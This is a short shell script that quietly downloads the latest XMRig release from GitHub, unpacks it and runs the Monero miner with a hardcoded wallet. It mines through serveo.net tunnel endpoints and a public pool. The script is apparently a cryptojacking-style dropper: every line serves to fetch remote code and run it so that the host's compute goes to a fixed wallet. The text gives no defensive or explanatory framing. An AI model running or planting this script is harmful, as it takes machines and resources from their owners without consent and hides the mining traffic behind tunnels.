#!/bin/sh

curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep "xmrig.*tar.gz" | cut -d : -f 2,3 | tr -d \" | wget -qi  - -O xm.tar.gz
mkdir xm
tar xvf xm.tar.gz -C xm --strip-components=1
chmod +x ./xm/xmrig
./xm/xmrig -r 10 -R 2 --no-color --donate-level 1 -o serveo.net:44444 --nicehash -o serveo.net:33333 --nicehash -o serveo.net:22222 --nicehash -o serveo.net:11111 --nicehash -o pool.supportxmr.com:3333 -u 86x4EkchvMLLZcL16bG25rJCRRukq5MYyT1fhUq2bAFP1fD9hLVCgNY8tC3wknFVW9BPsv6xSJWBa8ofyscqLe1j7xvg9Uz -p hash1 -k
